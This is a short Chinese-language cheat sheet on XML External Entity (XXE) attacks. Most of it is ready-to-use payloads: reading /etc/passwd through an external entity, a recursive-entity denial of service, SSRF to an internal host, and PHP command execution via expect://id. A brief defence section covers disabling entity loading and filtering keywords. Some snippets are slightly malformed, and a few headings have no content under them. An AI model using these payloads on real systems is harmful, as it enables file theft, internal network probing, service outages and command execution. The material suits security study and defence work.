# XXE

## 简介

XXE，XML External Entities。当XML解释器允许引用外部实体时，可以通过构造恶意XML内容，导致任意文件读取、执行系统命令、探测内网、攻击内网网站等等。一般XXE攻击基于回显或者报错才能进行，但是也可以通过Blind XXE的方式实现攻击。

## 利用

端口扫描，通过DTD盗取文件，RCE，钓鱼。

```js
<!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

**拒绝服务攻击**

通过递归引用实体，超过XML解释上限达到拒绝服务的目的。

```css
<!DOCTYPE data [
    <!ELEMENT data (#ANY)>
    <!ENTITY a0 "dos">
    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
]>
```

**任意文件读取**

```css
<!DOCTYPE data [
    <!ELEMENT data (#ANY)>
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

**SSRF**

```css
<!DOCTYPE data [
    <!ELEMENT data (#ANY)>
    <!ENTITY file SYSTEM "http://private">
]>
<data>&file;</data>
```

**执行系统命令**

在安装了expect扩展的PHP环境中：

```php
<?php
$xml = <<<EOF
<?xml version = "1.0"?>
<! DOCTYPE ANY [
    <!ENTITY xxe SYSTEM "expect://id"
]>
<x>&xxe;</x>
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?>
```

**探测内网端口**

攻击内网网站

## 防御

使用开发语言提供的禁用外部实体的方法，如PHP的libxml_disable_entity\_loader\(true\);

过滤用户提交的XML数据，关键词PUBLIC SYSTEM，



